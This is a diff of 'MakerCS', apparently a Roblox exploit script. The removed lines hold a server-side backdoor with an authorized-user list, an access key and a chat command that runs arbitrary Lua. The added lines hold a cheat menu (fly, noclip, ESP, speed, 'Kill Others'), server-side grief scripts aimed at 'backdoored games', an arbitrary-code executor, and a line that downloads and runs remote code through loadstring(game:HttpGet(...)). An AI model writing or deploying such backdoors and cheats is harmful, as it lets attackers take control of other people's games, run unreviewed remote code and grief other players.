-    Instance.new("UICorner", title).CornerRadius = UDim.new(0, 10)
-    
-    local userLabel = Instance.new("TextLabel")
-    userLabel.Size = UDim2.new(1,0,0,20)
-    userLabel.Position = UDim2.new(0,0,0,40)
-    userLabel.BackgroundColor3 = Color3.fromRGB(0,70,140)
-    userLabel.Text = "User: " .. player.Name
-    userLabel.TextColor3 = Color3.new(1,1,0.5)
-    userLabel.TextScaled = true
-    userLabel.Font = Enum.Font.GothamBold
-    userLabel.Parent = mainFrame
-    
-    -- Tabs
-    local tabFrame = Instance.new("Frame")
-    tabFrame.Size = UDim2.new(1,0,0,35)
-    tabFrame.Position = UDim2.new(0,0,0,60)
-    tabFrame.BackgroundColor3 = Color3.fromRGB(30,30,30)
-    tabFrame.Parent = mainFrame
-    Instance.new("UICorner", tabFrame).CornerRadius = UDim.new(0, 8)
-    
-    local tabs = {
-        {name = "SS Scripts", color = Color3.fromRGB(0,120,255)},
-        {name = "Executor", color = Color3.fromRGB(40,40,40)},
-        {name = "Commands", color = Color3.fromRGB(40,40,40)}
-    }
-    
-    local tabButtons = {}
-    local contentFrames = {}
-    
-    for i, tab in ipairs(tabs) do
-        local btn = Instance.new("TextButton")
-        btn.Size = UDim2.new(0.33, 0, 1, 0)
-        btn.Position = UDim2.new((i-1) * 0.33, 0, 0, 0)
-        btn.BackgroundColor3 = tab.color
-        btn.Text = tab.name
-        btn.TextColor3 = Color3.new(1,1,1)
-        btn.TextScaled = true
-        btn.Font = Enum.Font.GothamBold
-        btn.Parent = tabFrame
-        Instance.new("UICorner", btn).CornerRadius = UDim.new(0, 5)
-        tabButtons[tab.name] = btn
-        
-        local content = Instance.new("ScrollingFrame")
-        content.Size = UDim2.new(1,0,1,-95)
-        content.Position = UDim2.new(0,0,0,95)
-        content.BackgroundTransparency = 1
-        content.Visible = (i == 1)
-        content.CanvasSize = UDim2.new(0,0,0,0)
-        content.ScrollBarThickness = 8
-        content.Parent = mainFrame
-        
-        local layout = Instance.new("UIListLayout")
-        layout.Parent = content
-        layout.Padding = UDim.new(0, 10)
-        layout.SortOrder = Enum.SortOrder.LayoutOrder
-        layout:GetPropertyChangedSignal("AbsoluteContentSize"):Connect(function()
-            content.CanvasSize = UDim2.new(0, 0, 0, layout.AbsoluteContentSize.Y + 20)
+-- ============ DISCO ============
+local discoCon = nil
+local function toggleDisco()
+    discoOn = not discoOn
+    if discoOn then
+        discoCon = RS.Heartbeat:Connect(function()
+            if discoOn then
+                Lighting.Ambient = Color3.fromHSV(tick() % 5 / 5, 1, 1)
+                Lighting.ColorShift_Top = Color3.fromHSV((tick() + 1) % 5 / 5, 1, 0.5)
+                Lighting.ColorShift_Bottom = Color3.fromHSV((tick() + 2) % 5 / 5, 1, 0.5)
+            end
         end)
-        
-        contentFrames[tab.name] = content
+        notify("🕺 Disco ON")
+    else
+        if discoCon then discoCon:Disconnect() end
+        Lighting.Ambient = Color3.fromRGB(127, 127, 127)
+        Lighting.ColorShift_Top = Color3.fromRGB(0, 0, 0)
+        Lighting.ColorShift_Bottom = Color3.fromRGB(0, 0, 0)
+        notify("🕺 Disco OFF")
     end
-    
-    local minBtn = Instance.new("TextButton")
-    minBtn.Size = UDim2.new(0,30,0,30)
-    minBtn.Position = UDim2.new(1,-35,0,5)
-    minBtn.BackgroundColor3 = Color3.fromRGB(180,40,40)
-    minBtn.Text = "✕"
-    minBtn.TextColor3 = Color3.new(1,1,1)
-    minBtn.TextScaled = true
-    minBtn.Parent = mainFrame
-    Instance.new("UICorner", minBtn).CornerRadius = UDim.new(0, 8)
-    
-    local icon = Instance.new("TextButton")
-    icon.Size = UDim2.new(0,60,0,60)
-    icon.Position = UDim2.new(0.5,-30,0.2,0)
-    icon.BackgroundColor3 = Color3.fromRGB(0,100,200)
-    icon.Text = "⚙️"
-    icon.TextColor3 = Color3.new(1,1,1)
-    icon.TextScaled = true
-    icon.Visible = false
-    icon.Draggable = true
-    icon.Parent = gui
-    Instance.new("UICorner", icon).CornerRadius = UDim.new(0, 20)
-    
-    local function createButton(parent, text, callback, color)
-        local btn = Instance.new("TextButton")
-        btn.Size = UDim2.new(0.95, 0, 0, 45)
-        btn.BackgroundColor3 = color or Color3.fromRGB(40,40,40)
-        btn.Text = text
-        btn.TextColor3 = Color3.new(1,1,1)
-        btn.TextScaled = true
-        btn.Font = Enum.Font.GothamSemibold
-        btn.Parent = parent
-        Instance.new("UICorner", btn).CornerRadius = UDim.new(0, 8)
-        btn.MouseButton1Click:Connect(callback)
-        return btn
+end
+
+-- ============ SPEED ============
+local speedActive = false
+local originalSpeed = 16
+
+local function toggleSpeed()
+    if not hum then
+        notify("Wait for character!")
+        return
     end
-    
-    -- SS Scripts Tab
-    local ssContent = contentFrames["SS Scripts"]
-    
-    createButton(ssContent, "🌊 Toggle Flood", function()
-        if onCooldown(player, "Flood") then return end
-        toggleFlood()
-        player:SendNotification("Flood toggled!", "MakerCS")
-    end, Color3.fromRGB(70,40,40))
-    
-    createButton(ssContent, "🔥 Make Map Lava", function()
-        if onCooldown(player, "Lava") then return end
-        makeMapLava()
-        player:SendNotification("Map turned to lava!", "MakerCS")
-    end, Color3.fromRGB(70,40,40))
-    
-    createButton(ssContent, "❄️ Freeze Map", function()
-        if onCooldown(player, "Freeze") then return end
-        freezeMap()
-        player:SendNotification("Map frozen!", "MakerCS")
-    end, Color3.fromRGB(70,40,40))
-    
-    createButton(ssContent, "🌈 Toggle Rainbow Map", function()
-        if onCooldown(player, "Rainbow") then return end
-        toggleRainbowMap()
-        player:SendNotification("Rainbow toggled!", "MakerCS")
-    end, Color3.fromRGB(70,40,40))
-    
-    createButton(ssContent, "💀 Kill All Players", function()
-        if onCooldown(player, "Kill") then return end
-        killAllPlayers(player)
-        player:SendNotification("All players killed!", "MakerCS")
-    end, Color3.fromRGB(70,40,40))
-    
-    createButton(ssContent, "🚀 Launch All Players", function()
-        if onCooldown(player, "Launch") then return end
-        launchAllPlayers(player)
-        player:SendNotification("Players launched!", "MakerCS")
-    end, Color3.fromRGB(70,40,40))
-    
-    createButton(ssContent, "🛑 Freeze All Players", function()
-        if onCooldown(player, "FreezeP") then return end
-        freezeAllPlayers(player)
-        player:SendNotification("Players frozen!", "MakerCS")
-    end, Color3.fromRGB(70,40,40))
-    
-    createButton(ssContent, "💨 Unfreeze Players", function()
-        if onCooldown(player, "Unfreeze") then return end
-        unfreezeAllPlayers()
-        player:SendNotification("Players unfrozen!", "MakerCS")
-    end, Color3.fromRGB(70,40,40))
-    
-    createButton(ssContent, "🌑 Blackout", function()
-        if onCooldown(player, "Blackout") then return end
-        blackout()
-        player:SendNotification("Blackout enabled!", "MakerCS")
-    end, Color3.fromRGB(70,40,40))
-    
-    createButton(ssContent, "☀️ Restore Lighting", function()
-        if onCooldown(player, "Restore") then return end
-        restoreLighting()
-        player:SendNotification("Lighting restored!", "MakerCS")
-    end, Color3.fromRGB(70,40,40))
-    
-    createButton(ssContent, "💥 Global Shockwave", function()
-        if onCooldown(player, "Shockwave") then return end
-        shockwave()
-        player:SendNotification("Shockwave created!", "MakerCS")
-    end, Color3.fromRGB(70,40,40))
-    
-    createButton(ssContent, "⚡ Lightning Strikes", function()
-        if onCooldown(player, "Lightning") then return end
-        lightningStrike()
-        player:SendNotification("Lightning strikes!", "MakerCS")
-    end, Color3.fromRGB(70,40,40))
-    
-    -- Executor Tab
-    local execContent = contentFrames["Executor"]
-    
+    speedActive = not speedActive
+    if speedActive then
+        originalSpeed = hum.WalkSpeed
+        hum.WalkSpeed = 100
+        notify("⚡ Speed 100 ON")
+    else
+        hum.WalkSpeed = originalSpeed
+        notify("⚡ Speed OFF")
+    end
+end
+
+-- ============ JUMP ============
+local jumpActive = false
+local originalJump = 50
+
+local function toggleJump()
+    if not hum then
+        notify("Wait for character!")
+        return
+    end
+    jumpActive = not jumpActive
+    if jumpActive then
+        originalJump = hum.JumpPower
+        hum.JumpPower = 200
+        notify("🦘 Jump 200 ON")
+    else
+        hum.JumpPower = originalJump
+        notify("🦘 Jump OFF")
+    end
+end
+
+-- ============ CLIENT SCRIPTS ============
+local clientScripts = {
+    {"🏃 Speed 100", "game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = 100"},
+    {"🐢 Speed 16", "game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = 16"},
+    {"🦘 Jump 200", "game.Players.LocalPlayer.Character.Humanoid.JumpPower = 200"},
+    {"📏 Normal Jump", "game.Players.LocalPlayer.Character.Humanoid.JumpPower = 50"},
+    {"💥 Explode Self", "local p = game.Players.LocalPlayer.Character.HumanoidRootPart; local e = Instance.new('Explosion'); e.Position = p.Position; e.Parent = workspace"},
+    {"🔫 Kill Others", "for _, v in pairs(game.Players:GetPlayers()) do if v ~= game.Players.LocalPlayer and v.Character then v.Character.Humanoid.Health = 0 end end"},
+    {"🌞 Day Time", "game.Lighting.ClockTime = 14"},
+    {"🌙 Night Time", "game.Lighting.ClockTime = 0"},
+    {"🎨 Rainbow Character", "local c = game.Players.LocalPlayer.Character; for _, part in pairs(c:GetDescendants()) do if part:IsA('BasePart') then game:GetService('RunService').RenderStepped:Connect(function() part.Color = Color3.fromHSV(tick()%5/5,1,1) end) end end"},
+    {"💪 Super Strength", "game.Players.LocalPlayer.Character.Humanoid.MaxHealth = 1000; game.Players.LocalPlayer.Character.Humanoid.Health = 1000"},
+    {"📦 Infinite Yield", "loadstring(game:HttpGet('https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source'))()"},
+    {"🌌 Custom Skybox", "local s = Instance.new('Sky'); s.Parent = game.Lighting; s.SkyboxBk = 'rbxassetid://133260261393194'; s.SkyboxDn = 'rbxassetid://133260261393194'; s.SkyboxFt = 'rbxassetid://133260261393194'; s.SkyboxLf = 'rbxassetid://133260261393194'; s.SkyboxRt = 'rbxassetid://133260261393194'; s.SkyboxUp = 'rbxassetid://133260261393194'"}
+}
+
+-- ============ SS SCRIPTS (ServerSide - Attempts) ============
+local ssScripts = {
+    {"🌊 Attempt Flood", [[
+        for x = -200, 200, 50 do
+            for z = -200, 200, 50 do
+                local water = Instance.new("Part")
+                water.Size = Vector3.new(50, 1, 50)
+                water.Position = Vector3.new(x, -10, z)
+                water.Material = Enum.Material.Water
+                water.Color = Color3.fromRGB(0,100,255)
+                water.Transparency = 0.5
+                water.Anchored = true
+                water.CanCollide = false
+                water.Parent = workspace
+            end
+        end
+    ]]},
+    {"🔥 Attempt Lava Map", [[
+        for _, part in pairs(workspace:GetDescendants()) do
+            if part:IsA("BasePart") and part.Name ~= "HumanoidRootPart" then
+                part.Material = Enum.Material.Neon
+                part.Color = Color3.fromRGB(255,50,0)
+            end
+        end
+    ]]},
+    {"❄️ Attempt Freeze Map", [[
+        for _, part in pairs(workspace:GetDescendants()) do
+            if part:IsA("BasePart") then
+                part.Material = Enum.Material.Ice
+                part.Color = Color3.fromRGB(100,200,255)
+            end
+        end
+    ]]},
+    {"💀 Attempt Kill All", [[
+        for _, v in pairs(game.Players:GetPlayers()) do
+            if v ~= game.Players.LocalPlayer and v.Character then
+                v.Character.Humanoid.Health = 0
+            end
+        end
+    ]]},
+    {"🚀 Attempt Launch All", [[
+        for _, v in pairs(game.Players:GetPlayers()) do
+            if v ~= game.Players.LocalPlayer and v.Character then
+                v.Character.HumanoidRootPart.Velocity = Vector3.new(0, 500, 0)
+            end
+        end
+    ]]},
+    {"🛑 Attempt Freeze Players", [[
+        for _, v in pairs(game.Players:GetPlayers()) do
+            if v ~= game.Players.LocalPlayer and v.Character then
+                v.Character.Humanoid.WalkSpeed = 0
+                v.Character.Humanoid.JumpPower = 0
+            end
+        end
+    ]]},
+    {"💨 Attempt Unfreeze", [[
+        for _, v in pairs(game.Players:GetPlayers()) do
+            if v.Character then
+                v.Character.Humanoid.WalkSpeed = 16
+                v.Character.Humanoid.JumpPower = 50
+            end
+        end
+    ]]},
+    {"🌑 Attempt Blackout", [[
+        game.Lighting.Brightness = 0
+        game.Lighting.ClockTime = 0
+    ]]},
+    {"☀️ Attempt Restore Lighting", [[
+        game.Lighting.Brightness = 2
+        game.Lighting.ClockTime = 14
+    ]]},
+}
+
+-- ============ SCRIPT EXECUTOR ============
+local function createExecutor(parent)
     local execFrame = Instance.new("Frame")
-    execFrame.Size = UDim2.new(0.95, 0, 0, 150)
-    execFrame.BackgroundColor3 = Color3.fromRGB(30,30,40)
-    execFrame.Parent = execContent
-    Instance.new("UICorner", execFrame).CornerRadius = UDim.new(0, 8)
+    if isMobile then
+        execFrame.Size = UDim2.new(0.94, 0, 0, 140)
+    else
+        execFrame.Size = UDim2.new(0.94, 0, 0, 130)
+    end
+    execFrame.BackgroundColor3 = Color3.fromRGB(35,35,55)
+    execFrame.BackgroundTransparency = 0.1
+    execFrame.Parent = parent
+    Instance.new("UICorner", execFrame).CornerRadius = UDim.new(0, 10)
     
     local execTitle = Instance.new("TextLabel")
     execTitle.Size = UDim2.new(1,0,0,25)
     execTitle.BackgroundColor3 = Color3.fromRGB(100,50,50)
-    execTitle.Text = "💀 SERVERSIDE SCRIPT EXECUTOR"
+    execTitle.BackgroundTransparency = 0.2
+    execTitle.Text = "📝 SCRIPT EXECUTOR"
     execTitle.TextColor3 = Color3.new(1,1,1)
     execTitle.TextScaled = true
     execTitle.Font = Enum.Font.GothamBold
     execTitle.Parent = execFrame
-    Instance.new("UICorner", execTitle).CornerRadius = UDim.new(0, 8)
+    Instance.new("UICorner", execTitle).CornerRadius = UDim.new(0, 10)
     
     local scriptBox = Instance.new("TextBox")
-    scriptBox.Size = UDim2.new(0.95, 0, 0, 70)
-    scriptBox.Position = UDim2.new(0.025, 0, 0.25, 0)
-    scriptBox.BackgroundColor3 = Color3.fromRGB(20,20,30)
-    scriptBox.PlaceholderText = "Type serverside Lua script here...\nExample: game.Players:GetChildren()"
+    if isMobile then
+        scriptBox.Size = UDim2.new(0.96, 0, 0, 60)
+        scriptBox.Position = UDim2.new(0.02, 0, 0.25, 0)
+    else
+        scriptBox.Size = UDim2.new(0.96, 0, 0, 55)
+        scriptBox.Position = UDim2.new(0.02, 0, 0.25, 0)
+    end
+    scriptBox.BackgroundColor3 = Color3.fromRGB(20,20,35)
+    scriptBox.PlaceholderText = "Paste script here..."
     scriptBox.Text = ""
     scriptBox.TextColor3 = Color3.new(100,255,100)
     scriptBox.TextScaled = true
     scriptBox.Font = Enum.Font.Code
-    scriptBox.MultiLine = true
     scriptBox.Parent = execFrame
-    Instance.new("UICorner", scriptBox).CornerRadius = UDim.new(0, 5)
+    Instance.new("UICorner", scriptBox).CornerRadius = UDim.new(0, 8)
     
     local execBtn = Instance.new("TextButton")
-    execBtn.Size = UDim2.new(0.45, 0, 0, 35)
-    execBtn.Position = UDim2.new(0.025, 0, 0.75, 0)
-    execBtn.BackgroundColor3 = Color3.fromRGB(150,0,0)
-    execBtn.Text = "💀 EXECUTE"
+    execBtn.Size = UDim2.new(0.48, 0, 0, 35)
+    execBtn.Position = UDim2.new(0.02, 0, 0.72, 0)
+    execBtn.BackgroundColor3 = Color3.fromRGB(0,150,0)
+    execBtn.Text = "▶ EXECUTE"
     execBtn.TextColor3 = Color3.new(1,1,1)
     execBtn.TextScaled = true
     execBtn.Font = Enum.Font.GothamBold
     execBtn.Parent = execFrame
-    Instance.new("UICorner", execBtn).CornerRadius = UDim.new(0, 5)
+    Instance.new("UICorner", execBtn).CornerRadius = UDim.new(0, 8)
     
     local clearBtn = Instance.new("TextButton")
-    clearBtn.Size = UDim2.new(0.45, 0, 0, 35)
-    clearBtn.Position = UDim2.new(0.525, 0, 0.75, 0)
-    clearBtn.BackgroundColor3 = Color3.fromRGB(100,50,0)
-    clearBtn.Text = "CLEAR"
+    clearBtn.Size = UDim2.new(0.48, 0, 0, 35)
+    clearBtn.Position = UDim2.new(0.5, 0, 0.72, 0)
+    clearBtn.BackgroundColor3 = Color3.fromRGB(150,50,0)
+    clearBtn.Text = "🗑 CLEAR"
     clearBtn.TextColor3 = Color3.new(1,1,1)
     clearBtn.TextScaled = true
     clearBtn.Font = Enum.Font.GothamBold
     clearBtn.Parent = execFrame
-    Instance.new("UICorner", clearBtn).CornerRadius = UDim.new(0, 5)
+    Instance.new("UICorner", clearBtn).CornerRadius = UDim.new(0, 8)
     
     execBtn.MouseButton1Click:Connect(function()
         local code = scriptBox.Text
         if code and code ~= "" then
             local success, err = pcall(function()
-                local func = loadstring(code)
-                if func then
-                    func()
-                else
-                    error("Failed to compile")
-                end
+                loadstring(code)()
             end)
             if success then
-                player:SendNotification("✅ Script executed!", "Executor")
-                broadcastMessage("💀 " .. player.Name .. " executed a serverside script!")
+                notify("✅ Script executed!")
             else
-                player:SendNotification("❌ Error: " .. tostring(err), "Executor")
+                notify("❌ Error: " .. tostring(err))
             end
         end
     end)
+    
+    if isMobile then
+        execBtn.TouchTap:Connect(function()
+            local code = scriptBox.Text
+            if code and code ~= "" then
+                local success, err = pcall(function()
+                    loadstring(code)()
+                end)
+                if success then
+                    notify("✅ Script executed!")
+                else
+                    notify("❌ Error: " .. tostring(err))
+                end
+            end
+        end)
+    end
     
     clearBtn.MouseButton1Click:Connect(function()
         scriptBox.Text = ""
-        player:SendNotification("Script cleared!", "Executor")
+        notify("Cleared!")
     end)
-    
-    -- Commands Tab
-    local cmdContent = contentFrames["Commands"]
-    
-    local cmdHelp = Instance.new("TextLabel")
-    cmdHelp.Size = UDim2.new(0.95, 0, 0, 200)
-    cmdHelp.BackgroundColor3 = Color3.fromRGB(20,20,30)
-    cmdHelp.Text = "📢 CHAT COMMANDS:\n\n/e script [code] - Execute Lua script\n/e key " .. ACCESS_KEY .. " - Get access\n/e help - Show this menu\n\nUse /e script for quick execution!\nExample: /e script print('Hello')"
-    cmdHelp.TextColor3 = Color3.fromRGB(100,200,100)
-    cmdHelp.TextScaled = true
-    cmdHelp.Font = Enum.Font.GothamSemibold
-    cmdHelp.TextXAlignment = Enum.TextXAlignment.Left
-    cmdHelp.TextYAlignment = Enum.TextYAlignment.Top
-    cmdHelp.Parent = cmdContent
-    Instance.new("UICorner", cmdHelp).CornerRadius = UDim.new(0, 8)
-    
-    -- Tab switching
-    for name, btn in pairs(tabButtons) do
-        btn.MouseButton1Click:Connect(function()
-            for _, content in pairs(contentFrames) do
-                content.Visible = false
+end
+
+-- ============ POPULATE TABS ============
+
+-- MAIN TAB
+local mainContent = contentFrames["Main"]
+createButton(mainContent, "✈️ Toggle Fly", toggleFly, Color3.fromRGB(50,50,75))
+createButton(mainContent, "🚪 Toggle Noclip", toggleNoclip, Color3.fromRGB(50,50,75))
+createButton(mainContent, "👁️ Toggle ESP", toggleESP, Color3.fromRGB(50,50,75))
+createButton(mainContent, "👻 Toggle Invisible", toggleInvisible, Color3.fromRGB(50,50,75))
+createButton(mainContent, "🕺 Toggle Disco", toggleDisco, Color3.fromRGB(50,50,75))
+createButton(mainContent, "⚡ Toggle Speed (100)", toggleSpeed, Color3.fromRGB(60,60,85))
+createButton(mainContent, "🦘 Toggle Jump (200)", toggleJump, Color3.fromRGB(60,60,85))
+
+-- CLIENT SCRIPTS TAB
+local clientContent = contentFrames["Client Scripts"]
+
+-- Add Scan Game button
+createButton(clientContent, "🔍 SCAN GAME (Full Scan)", scanGame, Color3.fromRGB(0,100,150))
+
+for _, script in pairs(clientScripts) do
+    createButton(clientContent, script[1], function()
+        local success, err = pcall(function()
+            loadstring(script[2])()
+        end)
+        if success then
+            notify("✅ Executed: " .. script[1])
+        else
+            notify("❌ Error: " .. tostring(err))
+        end
+    end, Color3.fromRGB(55,55,80))
+end
+
+-- SS SCRIPTS TAB
+local ssContent = contentFrames["SS Scripts"]
+
+local ssWarning = Instance.new("TextLabel")
+ssWarning.Size = UDim2.new(0.94, 0, 0, 40)
+ssWarning.BackgroundColor3 = Color3.fromRGB(100,50,50)
+ssWarning.BackgroundTransparency = 0.3
+ssWarning.Text = "⚠️ SS Scripts may only work in backdoored games ⚠️"
+ssWarning.TextColor3 = Color3.fromRGB(255,200,100)
+ssWarning.TextScaled = true
+ssWarning.Font = Enum.Font.GothamBold
+ssWarning.Parent = ssContent
+Instance.new("UICorner", ssWarning).CornerRadius = UDim.new(0, 10)
+
+for _, script in pairs(ssScripts) do
+    createButton(ssContent, script[1], function()
+        local success, err = pcall(function()
+            loadstring(script[2])()
+        end)
+        if success then
+            notify("✅ Attempted: " .. script[1])
+        else
+            notify("❌ Failed: " .. tostring(err))
+        end
+    end, Color3.fromRGB(75,45,45))
+end
+
+-- EXECUTOR TAB
+local execContent = contentFrames["Executor"]
+createExecutor(execContent)
+
+-- Update canvas sizes
+local function updateAllCanvas()
+    task.wait(0.1)
+    for name, content in pairs(contentFrames) do
+        local count = 0
+        for _, child in pairs(content:GetChildren()) do
+            if child:IsA("TextButton") or child:IsA("Frame") then
+                count = count + 1
             end
-            for _, tabBtn in pairs(tabButtons) do
-                tabBtn.BackgroundColor3 = Color3.fromRGB(40,40,40)
-            end
-            contentFrames[name].Visible = true
-            btn.BackgroundColor3 = Color3.fromRGB(0,120,255)
+        end
+        content.CanvasSize = UDim2.new(0, 0, 0, (count * 55) + 30)
+    end
+end
+updateAllCanvas()
+
+for _, content in pairs(contentFrames) do
+    local layout = content:FindFirstChildWhichIsA("UIListLayout")
+    if layout then
+        layout:GetPropertyChangedSignal("AbsoluteContentSize"):Connect(function()
+            content.CanvasSize = UDim2.new(0, 0, 0, layout.AbsoluteContentSize.Y + 20)
         end)
     end
-    
-    minBtn.MouseButton1Click:Connect(function()
-        mainFrame.Visible = false
-        icon.Visible = true
+end
+
+-- Tab switching
+for name, btn in pairs(tabButtons) do
+    btn.MouseButton1Click:Connect(function()
+        for _, content in pairs(contentFrames) do
+            content.Visible = false
+        end
+        for _, tabBtn in pairs(tabButtons) do
+            tabBtn.BackgroundColor3 = Color3.fromRGB(45,45,65)
+        end
+        contentFrames[name].Visible = true
+        btn.BackgroundColor3 = Color3.fromRGB(0,120,200)
     end)
-    
-    icon.MouseButton1Click:Connect(function()
+end
+
+-- Minimize / Restore
+local icon = Instance.new("TextButton")
+if isMobile then
+    icon.Size = UDim2.new(0, 60, 0, 60)
+    icon.Position = UDim2.new(0.02, 0, 0.85, 0)
+else
+    icon.Size = UDim2.new(0, 50, 0, 50)
+    icon.Position = UDim2.new(0.02, 0, 0.87, 0)
+end
+icon.BackgroundColor3 = Color3.fromRGB(0,150,255)
+icon.Text = "⚙️\nCS"
+icon.TextColor3 = Color3.new(1,1,1)
+icon.TextScaled = true
+icon.Visible = false
+icon.Draggable = true
+icon.Parent = gui
+Instance.new("UICorner", icon).CornerRadius = UDim.new(0, 30)
+
+minBtn.MouseButton1Click:Connect(function()
+    mainFrame.Visible = false
+    icon.Visible = true
+end)
+
+icon.MouseButton1Click:Connect(function()
+    mainFrame.Visible = true
+    icon.Visible = false
+end)
+
+if isMobile then
+    icon.TouchTap:Connect(function()
         mainFrame.Visible = true
         icon.Visible = false
     end)
-    
-    player:SendNotification("🔑 MakerCS Loaded! You have full access!", "Welcome")
 end
 
--- ============ INITIALIZATION ============
--- Setup backdoor for players
-Players.PlayerAdded:Connect(function(player)
-    task.wait(0.5)
-    if isAuthorized(player) then
-        createGUI(player)
-        player:SendNotification("✅ Backdoor access granted! Use /e help for commands.", "Backdoor")
-        player.Chatted:Connect(function(message)
-            handleChat(message, player)
-        end)
-        
-        -- Give special chat color
-        pcall(function()
-            local speaker = Chat:FindFirstChild(player.Name)
-            if speaker then
-                speaker:SetExtraData("NameColor", Color3.fromRGB(255, 100, 100))
-                speaker:SetExtraData("ChatColor", Color3.fromRGB(255, 200, 200))
-            end
-        end)
-    end
-end)
-
--- Handle existing players
-for _, player in pairs(Players:GetPlayers()) do
-    task.spawn(function()
-        if isAuthorized(player) then
-            createGUI(player)
-            player.Chatted:Connect(function(message)
-                handleChat(message, player)
-            end)
-        end
-    end)
-end
-
--- Store access key in ReplicatedStorage
-local keyFolder = Instance.new("Folder")
-keyFolder.Name = ACCESS_KEY
-keyFolder.Parent = ReplicatedStorage
+-- Final welcome
+notify("✅ MakerCS Loaded!")
+notify("Executor: " .. executor)
+notify("Game: " .. game.Name)
+notify(isMobile and "📱 Mobile Mode Active" or "💻 PC Mode Active")
 
 print("========================================")
-print("MakerCS Backdoor System Loaded!")
-print("Authorized Users:")
-for i = 1, #Access do
-    print("  - " .. Access[i])
-end
-print("Access Key: " .. ACCESS_KEY)
+print("MakerCS - Complete Script")
+print("Executor: " .. executor)
+print("Game: " .. game.Name .. " (ID: " .. placeId .. ")")
+print("Mobile: " .. tostring(isMobile))
+print("Tabs: Main, Client Scripts, SS Scripts, Executor")
 print("========================================")
